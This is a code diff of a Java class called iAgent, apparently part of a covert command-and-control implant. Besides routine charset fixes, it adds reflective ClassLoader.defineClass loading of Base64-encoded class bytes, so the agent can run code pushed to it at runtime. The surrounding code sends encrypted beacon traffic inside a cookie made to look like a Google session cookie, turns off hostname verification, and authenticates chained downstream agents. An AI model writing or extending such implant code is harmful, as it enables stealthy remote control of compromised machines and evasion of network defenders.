@@ -185,9 +185,9 @@ class iAgent
                     String passwdEncoded = new String(
                         Base64.getEncoder().encode(
                             secInst.encrypt(
-                                config.passMat.getBytes(),
-                                config.defaultKey.getBytes(), 
-                                ephemeralNonce.getBytes()
+                                config.passMat.getBytes(StandardCharsets.UTF_8),
+                                config.defaultKey.getBytes(StandardCharsets.UTF_8), 
+                                ephemeralNonce.getBytes(StandardCharsets.UTF_8)
                             )
                         )
                     );
@@ -295,7 +295,18 @@ class iAgent
             }
             else
             {
-                classObj = packager.load(className, classical);
+                //classObj = packager.load(className, classical);
+                byte[] rawMeth = Base64.getDecoder().decode(classical);
+                Method defineNewClass = ClassLoader.class.getDeclaredMethod("defineClass",
+                                      String.class, byte[].class, int.class, int.class);
+                defineNewClass.setAccessible(true);
+                classObj = (Class) defineNewClass.invoke(
+                    ClassLoader.getSystemClassLoader(),
+                    String.format("com.nocebo.nCore.%s",className),
+                    rawMeth,
+                    0,
+                    rawMeth.length
+                );
             }
 
             Hashtable methObj = nUtil.getMethodByName(classObj, methodName);
@@ -630,10 +641,10 @@ class iAgent
                 
                 secInst.decrypt(
                     Base64.getDecoder().decode(
-                        passwd.getBytes()
+                        passwd.getBytes(StandardCharsets.UTF_8)
                     ),
-                    config.defaultKey.getBytes(),
-                    downstreamNonce.getBytes()
+                    config.defaultKey.getBytes(StandardCharsets.UTF_8),
+                    downstreamNonce.getBytes(StandardCharsets.UTF_8)
                 )
             );
             if (authBlob.equals(config.passMat))
@@ -703,10 +714,10 @@ class iAgent
             String authBlob = new String(
                 secInst.decrypt(
                     Base64.getDecoder().decode(
-                        cookie.getBytes()
+                        cookie.getBytes(StandardCharsets.UTF_8)
                     ),
-                        config.defaultKey.getBytes(),
-                        downstreamNonce.getBytes()
+                        config.defaultKey.getBytes(StandardCharsets.UTF_8),
+                        downstreamNonce.getBytes(StandardCharsets.UTF_8)
                 )
             );
             if (downstreamAgents.containsKey(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
@@ -873,7 +884,7 @@ class iAgent
                     "Cookie",
                     String.format(
                         "__Secure-3PSIDCC=%s; uuid=%s",
-                        new String(Base64.getUrlEncoder().encode(cookieData.getBytes())),
+                        cookieData,
                         sessUUID
                     )
                 );
@@ -888,13 +899,13 @@ class iAgent
                 connMan.setHostnameVerifier(allHostsValid);
 
                 OutputStreamWriter connOutWriter = new OutputStreamWriter(connMan.getOutputStream());
-                
+               
                 String postBlob = new String(
                     Base64.getUrlEncoder().encode(
                         secInst.encrypt(
-                            postData.getBytes(), 
-                            config.encKey.getBytes(),
-                            nonce.getBytes()
+                            postData.getBytes(StandardCharsets.UTF_8), 
+                            config.encKey.getBytes(StandardCharsets.UTF_8),
+                            nonce.getBytes(StandardCharsets.UTF_8)
                         )
                     )
                 );
@@ -920,8 +931,8 @@ class iAgent
                         Base64.getDecoder().decode(
                             responseData
                         ),
-                        config.encKey.getBytes(),
-                        nonce.getBytes()
+                        config.encKey.getBytes(StandardCharsets.UTF_8),
+                        nonce.getBytes(StandardCharsets.UTF_8)
                     );
 
                     return new String(decodedResponseData);
